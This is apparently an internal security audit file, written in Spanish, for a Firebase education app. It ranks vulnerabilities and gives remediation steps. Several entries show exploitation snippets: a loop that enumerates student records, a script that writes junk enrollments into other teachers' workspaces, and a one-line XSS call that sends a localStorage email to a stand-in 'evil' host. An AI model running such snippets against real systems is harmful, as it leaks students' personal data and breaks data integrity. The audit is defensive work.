## ZERO_DAYS

> Last audited: 2026-04-20
> Scope: `apps/core-web`, `apps/flow-web`, `apps/login-web`, `apps/functions`, `libs/cloud-services`, Firebase config

### ¿Qué es este documento?

Un **zero-day** es una vulnerabilidad de seguridad que existe **hoy mismo en producción** y que un atacante podría explotar **antes** de que el equipo aplique un parche. A diferencia de `TECHDEBT.md` (que rastrea deuda de calidad), este archivo rastrea **riesgos de seguridad activos**: cualquier issue listado aquí es explotable y debe priorizarse por encima de features.

Cada entrada incluye:

- **Qué es** — descripción técnica del problema.
- **En qué consiste** — el vector exacto de explotación, con referencia al código.
- **Por qué solucionarlo** — el impacto real (qué se rompe, qué se filtra, a quién afecta).
- **Guía de remediación** — pasos accionables, con archivos a tocar.

Severidades: **P0** (explotable hoy, impacto crítico) → **P3** (defensa en profundidad).

---

## P0 — Critical (explotable hoy, parar todo)

### P0-2 — `.env` con credenciales de producción comiteadas a git

| Campo           | Valor                                                               |
| --------------- | ------------------------------------------------------------------- |
| Archivo         | `.env` (tracked en git, commit `b699bcf`)                           |
| Gitignore       | `.gitignore` no contiene `.env`                                     |
| Datos expuestos | `PUBLIC_FIREBASE_API_KEY=AIzaSyByujsaETdMHA-...`, `projectId`, etc. |

**Qué es.** El archivo `.env` está versionado en el repositorio. El `.gitignore` no lo excluye (ver `.gitignore:1-31`).

**En qué consiste.** Aunque las claves de Firebase Web son técnicamente "públicas" (van en el bundle JS), versionarlas:

1. **Impide rotación**: cambiar la key requiere reescribir historia.
2. **Normaliza** comitear secretos → eventualmente se filtra uno de servidor (Stripe, OpenAI, service account).
3. **Permanece en git log**, forks, mirrors, GitHub Actions logs.
4. **Magnifica P0-3**: con la API key + projectId pública un atacante puede instanciar el SDK desde cualquier lado y atacar las rules.

**Guía de remediación.**

1. Añadir a `.gitignore`:

```
.env
.env.local
.env.*.local
*.pem
*.key
serviceAccountKey*.json
secrets.json
```

2. `git rm --cached .env && git commit -m "chore: stop tracking .env"`.
3. Documentar copy-from-example en README.
4. Para CI usar **GitHub Secrets** (`secrets.PUBLIC_FIREBASE_API_KEY`).
5. Habilitar **App Check** en Firebase Console para que la API key solo funcione desde tus dominios (también resuelve P2-4).
6. Rotar la API key actual en GCP Console y purgar historia con `git filter-repo` (recomendado si el repo es público).

---

### P0-3 — Firestore rules permiten lectura cross-tenant de PII de estudiantes

| Archivo | `firestore.rules:31-33` |
| ------- | ----------------------- |

**Qué es.**

```
match /students/{identificationNumber} {
  allow read: if request.auth != null;
  allow write: if false;
  ...
}
```

Cualquier usuario autenticado puede leer cualquier doc en `students/{id}` si conoce o adivina el `identificationNumber`.

**En qué consiste.** Combinado con P2-1 (los IDs nacionales tienen rangos predecibles), un atacante autenticado (por ejemplo otro estudiante o un teacher malicioso) puede enumerar:

```js
// Desde devtools, con cualquier cuenta autenticada
for (const id of generateIdRange()) {
  const snap = await getDoc(doc(db, `students/${id}`))
  if (snap.exists()) leak(snap.data()) // { uid, name, identificationNumber, createdAt, ... }
}
```

Filtra `name + identificationNumber` masivamente.

**Por qué solucionarlo.** Cumplimiento legal (GDPR, LFPDPPP, Habeas Data). Una sola cuenta comprometida exfiltra toda la base de estudiantes.

**Guía de remediación.**

1. Restringir lectura a "el propio estudiante" o "un teacher en cuyo workspace está enrolado":

```
match /students/{identificationNumber} {
  allow read: if request.auth != null
    && (request.auth.uid == resource.data.uid
        || exists(/databases/$(database)/documents/users/$(request.auth.uid)/students/$(identificationNumber)));
  allow write: if false;
}
```

2. Añadir test en `tests/rules/firestore.test.ts` cubriendo: same-user OK, teacher-with-enrollment OK, otro-student-DENIED, anónimo-DENIED.
3. Idealmente migrar a `students/{uid}` (ver P2-1).

---

## P1 — High (explotable con esfuerzo moderado)

### P1-3 — Sin control de acceso por rol (cualquier user puede entrar a `core-web`)

| Archivo | `apps/core-web/src/modules/AuthGuard/useAuthGuard.ts`, `apps/core-web/src/services/user/user.types.ts` |
| ------- | ------------------------------------------------------------------------------------------------------ |

**Qué es.** `UserDocument` no tiene campo `role`. El guard solo verifica que exista un perfil. Un usuario que crea cuenta (o que escribe directamente a `users/{myUid}` — permitido por las rules: `request.auth.uid == uid`) entra al panel de teachers.

**En qué consiste.**

1. Sign up normal en `login-web`.
2. Escribir su propio doc en `users/{uid}` (las rules lo permiten porque eres dueño).
3. Navegar a `/core/` → acceso completo a UI de teacher (channels, students, enrollments).

**Por qué solucionarlo.** Privilege escalation trivial. Sin separación de roles el modelo de permisos es ficticio.

**Guía de remediación.**

1. Añadir `role: 'teacher' | 'student'` a `UserDocument`.
2. Asignar el rol vía custom claims en una Cloud Function al registrar (`admin.auth().setCustomUserClaims(uid, { role: 'teacher' })`).
3. Endurecer las rules:

```
match /users/{uid} {
  allow create: if request.auth.uid == uid && request.auth.token.role == 'teacher';
  allow read, update, delete: if request.auth.uid == uid;
}
```

4. En `useAuthGuard` leer `idTokenResult.claims.role` y redirigir a `/flow/` si no es `teacher`.

---

### P1-4 — `E2E_BYPASS=true` expone instancia de Auth en `window.__e2eAuth`

| Archivo | `libs/cloud-services/src/factory.ts:66-68`, `apps/*/rsbuild.config.ts:24` |
| ------- | ------------------------------------------------------------------------- |

**Qué es.** Cuando la env `E2E_BYPASS=true`:

```ts
;(window as unknown as Record<string, unknown>).__e2eAuth = services.auth
```

Y los AuthGuards saltan el redirect (`useAuthGuard.ts:10` y `apps/flow-web/.../useAuthGuard.ts:9`).

**En qué consiste.** Si la env se filtra a un build de prod (CI mal configurado, `.env.production` mezclado), cualquier visitante hace `window.__e2eAuth.signInWithEmail(...)` saltándose la UI **y se conecta a emulators inexistentes**, generando errores que confunden monitoreo.

**Por qué solucionarlo.** Defensa en profundidad: que la puerta no exista en bundles de prod.

**Guía de remediación.**

1. Reemplazar el env runtime por **build flag** que el bundler tree-shake en producción:

```ts
// rsbuild.config.ts (todos los apps)
define: {
  __E2E_BYPASS__: JSON.stringify(process.env.NODE_ENV !== 'production' && process.env.E2E_BYPASS === 'true'),
}
```

```ts
declare const __E2E_BYPASS__: boolean
if (__E2E_BYPASS__) {
  ;(window as Record<string, unknown>).__e2eAuth = services.auth
}
```

2. CI gate: `grep -r "__e2eAuth" deploy/ && exit 1`.
3. Documentar en `.cursor/rules/cloud-services.mdc` que `E2E_BYPASS` solo va en `playwright.config.ts`.

---

### P1-5 — Firestore rules permiten poisoning de enrollments en cualquier teacher

| Archivo | `firestore.rules:20-24` |
| ------- | ----------------------- |

**Qué es.**

```
match /users/{uid}/students/{identificationNumber} {
  allow read: if request.auth != null;
  allow create: if request.auth != null;          // permite a cualquiera
  allow update, delete: if request.auth != null && request.auth.uid == uid;
}
```

Cualquier usuario autenticado puede crear documentos de enrollment en el workspace de cualquier teacher.

**En qué consiste.** Un atacante autenticado puede:

```js
await setDoc(doc(db, `users/${victimTeacherUid}/students/${anyId}`), {
  name: 'spam',
  identificationNumber: anyId,
  status: 'active',
  joinedAt: new Date().toISOString(),
})
```

Inunda la lista de alumnos del teacher con basura. El teacher puede borrar reactivamente, pero el ataque se reanuda. Si la UI carga miles de docs → DoS de UI/cuotas.

**Por qué solucionarlo.** Data integrity y costo (lecturas Firestore en plan Blaze).

**Guía de remediación.**

1. Restringir `create` al backend o al propio estudiante con código válido:

```
allow create: if request.auth != null
  && request.auth.uid == request.resource.data.uid
  && exists(/databases/$(database)/documents/codeRedemptions/$(request.auth.uid)_$(uid));
```

2. Mover el flujo de enrollment a una Cloud Function `redeemInviteCode(code)` que valida el código y escribe ambos lados con Admin SDK (defensa en profundidad).

---

### P1-6 — Race condition en `studentRegister` (sin transacción)

| Archivo | `apps/functions/src/student-register.ts:18-31` |
| ------- | ---------------------------------------------- |

**Qué es.** El flujo es `get(existing)` → `createUser` → `set(credentials)` sin lock.

**En qué consiste.** Dos requests concurrentes con el mismo `identificationNumber`:

1. Ambos pasan `if (existing.exists())` (no existe aún).
2. Ambos llaman `getAuth().createUser({})` → se crean **dos** users en Auth.
3. El último `db.ref(...).set(...)` sobrescribe al primero → el primer user queda **huérfano** en Auth y el segundo controla las credenciales.

Si el atacante hace race con un usuario legítimo registrándose puede **secuestrar el slot** del student.

**Por qué solucionarlo.** Account takeover, usuarios huérfanos en Auth (costo + confusión).

**Guía de remediación.** Usar transacción RTDB (atómica):

```ts
const result = await db
  .ref(`${STUDENTS_RTDB_PATH}/${identificationNumber}`)
  .transaction((current) => {
    if (current !== null) return
    return { reserving: true }
  })
if (!result.committed) {
  throw new HttpsError(ErrorCode.AlreadyExists, ErrorMessage.StudentAlreadyExists)
}
// Solo ahora crear el Auth user y escribir definitivo.
```

---

### P1-7 — Sin política de password en `studentRegister`/`studentLogin`

| Archivo | `apps/functions/src/student-register.ts:13-15` |
| ------- | ---------------------------------------------- |

**Qué es.** La única validación es `if (!password)`. Acepta `"a"` como password.

**En qué consiste.** Un estudiante (o atacante haciendo el registro) puede crear cuentas con password de 1 carácter. Combinado con P2-4 (sin rate limit en `studentLogin`), brute-force es trivial: 36 intentos para 1 char alfanumérico, 1296 para 2 chars.

**Guía de remediación.**

1. Validar en la Cloud Function:

```ts
const PASSWORD_MIN_LENGTH = 12
if (password.length < PASSWORD_MIN_LENGTH) {
  throw new HttpsError(ErrorCode.InvalidArgument, ErrorMessage.WeakPassword)
}
```

2. Añadir validación equivalente en cliente (UX) usando `zod`/`yup`.
3. Considerar checks contra [HIBP](https://haveibeenpwned.com/Passwords) para passwords filtradas.

---

## P2 — Medium (defensa en profundidad)

### P2-1 — PII (números de identificación) almacenados como claves de DB

| Archivos | `student.service.ts`, `enrollment.service.ts`, `firestore.rules:31` |
| -------- | ------------------------------------------------------------------- |

**Qué es.** El `identificationNumber` (típicamente DNI/CC/CURP) se usa como **key directa de documento** en `students/{idNumber}`, `studentCredentials/{idNumber}`, `users/{uid}/students/{idNumber}`.

**En qué consiste.** Las claves de Firestore son **enumerables** vía `listDocuments` (Admin SDK) o adivinables por brute force (los IDs nacionales tienen rangos predecibles). Esto facilita:

1. Enumeración masiva de estudiantes registrados.
2. Cross-referencing con otras bases de datos filtradas (ataques de correlación).
3. Una sola filtración expone PII directamente sin necesidad de joins.

Escala el impacto de **P0-3** y **P1-5**.

**Por qué solucionarlo.** Cumplimiento legal (GDPR, LFPDPPP en MX, Habeas Data en CO). Las PII no deben ser identificadores primarios accesibles desde el cliente.

**Guía de remediación.**

1. Usar el **uid de Firebase Auth como clave primaria**: `students/{uid}`.
2. Mantener un mapeo separado y server-side `idNumberLookup/{hash(idNumber)} → uid` para login (lookup hecho por Cloud Function).
3. Hashear el ID con `HMAC-SHA256(idNumber, serverSecret)` antes de usarlo como key, si forzosamente debe ser indexable.
4. Cifrar el `identificationNumber` "at rest" con KMS si debe persistirse en claro para compliance.

---

### P2-2 — Sin Content Security Policy ni headers de seguridad

| Archivos | `firebase.json` (sin `headers`) |
| -------- | ------------------------------- |

**Qué es.** `firebase.json:15-25` no define `headers`. Faltan: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`.

**En qué consiste.** Sin CSP, un XSS (incluso uno transitorio, ej. `dangerouslySetInnerHTML` futuro o paquete npm comprometido) ejecuta sin restricciones. Sin HSTS, ataque MITM en primera visita. Sin frame-ancestors, clickjacking trivial embebiendo el sitio en un iframe atacante.

**Por qué solucionarlo.** Defensa en profundidad. Costo ≈ 1 hora, beneficio enorme.

**Guía de remediación.** Añadir a `firebase.json`:

```json
{
  "hosting": {
    "headers": [
      {
        "source": "**",
        "headers": [
          {
            "key": "Strict-Transport-Security",
            "value": "max-age=63072000; includeSubDomains; preload"
          },
          { "key": "X-Content-Type-Options", "value": "nosniff" },
          { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
          { "key": "Permissions-Policy", "value": "geolocation=(), microphone=(), camera=()" },
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
          }
        ]
      }
    ]
  }
}
```

Iterar el CSP en modo `Content-Security-Policy-Report-Only` durante una semana, ajustar, y promover a enforcing.

---

### P2-3 — Email/Name del usuario en `localStorage` en texto plano

| Archivos | `apps/login-web/src/modules/Login/Login.utils.ts`, `apps/login-web/src/modules/CreateAccount/CreateAccount.utils.ts` |
| -------- | -------------------------------------------------------------------------------------------------------------------- |

**Qué es.** El flujo magic-link almacena `emailForSignIn`, `emailForSignUp` y `nameForSignUp` en `localStorage`.

**En qué consiste.** `localStorage` es **accesible por cualquier script** ejecutándose en el origin (XSS, extensiones del navegador maliciosas, scripts de terceros). Un XSS de 1 línea (`fetch('https://evil/?e='+localStorage.emailForSignIn)`) filtra el email/nombre.

**Por qué solucionarlo.** No es crítico solo (es solo email/nombre), pero combinado con un futuro XSS o extensiones expone al usuario a phishing dirigido.

**Guía de remediación.**

1. Migrar a `sessionStorage` (se borra al cerrar pestaña).
2. Limpiar inmediatamente después del sign-in (verificar con tests).
3. Endurecer con CSP estricto (P2-2).
4. Considerar cookies `HttpOnly + SameSite=Strict + Secure` si se introduce un backend.

---

### P2-4 — Sin App Check ni rate limiting en Cloud Functions

| Archivos | `apps/functions/src/student-login.ts`, `apps/functions/src/student-register.ts`, `apps/functions/src/generate-invite-code.ts` |
| -------- | ----------------------------------------------------------------------------------------------------------------------------- |

> **Progreso:** `signInAnonymously` eliminado del flujo de estudiantes (migrado a `signInWithCustomToken` vía Cloud Functions). El Anonymous provider puede deshabilitarse en Firebase Console.

**Qué es.** Verificado: 0 ocurrencias de `appCheck`/`initializeAppCheck` en el repo. Las Cloud Functions son invocables sin restricción de origen ni rate limit.

**En qué consiste.** Un atacante puede automatizar llamadas para brute-force de contraseñas o creación masiva de cuentas, generando costo monetario y degradando UX.

**Por qué solucionarlo.** Posible **denial-of-wallet** en plan Blaze. Brute-force de contraseñas sin rate limiting (agravado por P1-7).

**Guía de remediación.**

1. Habilitar **Firebase App Check** con reCAPTCHA v3 (web) en `libs/cloud-services/src/factory.ts`.
2. Marcar las Cloud Functions con `enforceAppCheck: true` (`onCall({ enforceAppCheck: true }, ...)`).
3. Implementar rate limiting (por IP y por `identificationNumber`) usando Firebase Extensions (`firestore-counter`) o Redis/Memorystore.
4. Alertas en GCP Budgets para detectar denial-of-wallet.
5. **Deshabilitar Anonymous provider** en Firebase Console (ya no se usa en el flujo de estudiantes).

---

### P2-5 — `try/catch` que swallow errores y enmascara fallos de seguridad

| Archivos | `useFlowAuth.ts`, `useCreateAccountFlow.ts`, varios |
| -------- | --------------------------------------------------- |

**Qué es.** Patrón repetido:

```ts
try { ... } catch { setAuthError(FlowAuthError.Unknown); setStatus(Idle) }
```

Sin logging, sin diferenciación de errores, sin telemetría. Verificado: 0 ocurrencias de `Sentry`/`Crashlytics` en el repo.

**En qué consiste.** Si un atacante intenta explotar (ej. forzar un `permission-denied` en Firestore), el error se traga silenciosamente. El equipo no se entera de intentos de ataque ni de fallos reales hasta que ya es tarde.

**Por qué solucionarlo.** Visibilidad. Sin telemetría no se detectan ataques en curso.

**Guía de remediación.**

1. Integrar Sentry / Firebase Crashlytics for Web.
2. Loguear `error.code` discriminando `permission-denied` (potencial ataque), `unavailable` (red), `not-found` (UX).
3. Añadir alertas en Sentry para tasas anómalas de `permission-denied`.
4. No mostrar `error.message` crudo al usuario (puede filtrar internals), pero sí enviarlo a la telemetría.

---

### P2-6 — Argon2 con parámetros por defecto (puede no cumplir OWASP)

| Archivo | `apps/functions/src/student-register.ts:26` |
| ------- | ------------------------------------------- |

**Qué es.** `argon2.hash(password, { type: argon2.argon2id })` no especifica `memoryCost`, `timeCost`, `parallelism`.

**Por qué solucionarlo.** Defaults pueden no resistir hardware moderno. OWASP recomienda mínimo `memoryCost: 19_456` KiB, `timeCost: 2`, `parallelism: 1` para argon2id.

**Guía de remediación.**

```ts
const ARGON2_OPTIONS = {
  type: argon2.argon2id,
  memoryCost: 19_456,
  timeCost: 2,
  parallelism: 1,
} as const

const hashedPassword = await argon2.hash(password, ARGON2_OPTIONS)
```

Centralizar en un módulo compartido por `student-register.ts` y `student-login.ts`. Añadir test que verifique que el hash tiene el prefijo `$argon2id$v=19$m=19456,t=2,p=1$...`.

---

### P2-7 — Invite codes sin expiración, rotación ni límite de usos

| Archivo | `apps/functions/src/generate-invite-code.ts` |
| ------- | -------------------------------------------- |

**Qué es.** El código se almacena solo como `{ uid }` en `codes/{code}` y nunca caduca. Una vez compartido (screenshot, WhatsApp, email reenviado), cualquiera con el código se enrola.

**Guía de remediación.**

1. Schema enriquecido:

```ts
interface InviteCodeEntry {
  readonly uid: string
  readonly createdAt: number
  readonly expiresAt: number
  readonly maxUses: number
  readonly usesRemaining: number
}
```

2. Validar `expiresAt > Date.now()` y `usesRemaining > 0` en la Cloud Function que redime.
3. Botón "Rotate code" en la UI del teacher → invalida el anterior, genera nuevo.
4. Audit log: `codeRedemptions/{code}_{uid}` registrando quién lo usó y cuándo.
5. Considerar caracteres sin ambigüedad (excluir `0/O`, `1/I/l`) si se dicta verbalmente.

---

## P3 — Low (mejoras a futuro)

### P3-1 — `getCoreAppUrl` y similares dependen de `BASE_PATH` con fallback laxo

`(import.meta.env.BASE_PATH as string) ?? '/'` no maneja string vacía. No es vulnerabilidad directa pero introduce comportamiento ambiguo en redirects → potencial open-redirect si `BASE_PATH` se setea desde fuente no confiable. Mantener `BASE_PATH` exclusivamente compile-time.

### P3-2 — `.env.example` no documenta requisitos de App Check ni de rotación

Añadir comentarios indicando claves obligatorias vs opcionales y enlace a la guía de rotación.

### P3-3 — Sin `subresource integrity` en bundles

Los `<script src>` generados no llevan `integrity="sha384-..."`. Defensa contra CDN compromise (no aplica si todo se sirve desde Firebase Hosting same-origin, pero conviene para fonts/CDN externos).

### P3-4 — `.gitignore` carece de patrones de secretos comunes

`*.pem`, `*.key`, `serviceAccountKey*.json`, `secrets.json` no están excluidos. Si en el futuro alguien descarga la service account de Firebase Admin SDK al root para debug local, queda comiteado por accidente. Añadir como medida proactiva (incluido en remediación de P0-2).

### P3-5 — Pre-deploy de Firebase no corre tests de rules

`firebase.json` no define `predeploy` para `firestore`/`database`. Un commit que rompa rules puede pasar a producción sin que `tests/rules/*.test.ts` se ejecute como gate. Añadir:

```json
{
  "firestore": {
    "rules": "firestore.rules",
    "predeploy": "pnpm test:rules"
  },
  "database": {
    "rules": "database.rules.json",
    "predeploy": "pnpm test:rules"
  }
}
```

Y crear el script en el `package.json` raíz:

```json
"scripts": { "test:rules": "vitest run --config tests/rules/vitest.config.ts" }
```

---

## Resumen ejecutivo

| ID    | Severidad | Esfuerzo | Bloquea release | Estado    |
| ----- | --------- | -------- | --------------- | --------- |
| P0-2  | Crítica   | 1 hora   | Sí              | Pendiente |
| P0-3  | Crítica   | 2 horas  | Sí              | **Nuevo** |
| P1-3  | Alta      | 2 días   | Sí              | Pendiente |
| P1-4  | Alta      | 4 horas  | Recomendado     | Pendiente |
| P1-5  | Alta      | 4 horas  | Sí              | **Nuevo** |
| P1-6  | Alta      | 2 horas  | Sí              | **Nuevo** |
| P1-7  | Alta      | 1 hora   | Sí              | **Nuevo** |
| P2-1  | Media     | 2-3 días | No              | Pendiente |
| P2-2  | Media     | 4 horas  | Recomendado     | Pendiente |
| P2-3  | Media     | 1 hora   | No              | Pendiente |
| P2-4  | Media     | 4 horas  | Recomendado     | Parcial   |
| P2-5  | Media     | 1 día    | No              | Pendiente |
| P2-6  | Media     | 1 hora   | No              | **Nuevo** |
| P2-7  | Media     | 1 día    | No              | **Nuevo** |
| P3-\* | Baja      | < 1 día  | No              | Pendiente |

**Acción inmediata sugerida (orden):**
P0-2 (1 h, untrack `.env`) → P0-3 (2 h, hardening de rules + tests) → P1-7 (1 h, password length) → P1-6 (2 h, transaction) → P1-5 (4 h, rules + función redeem) → P1-4 → P1-3 → P2-6 → resto.
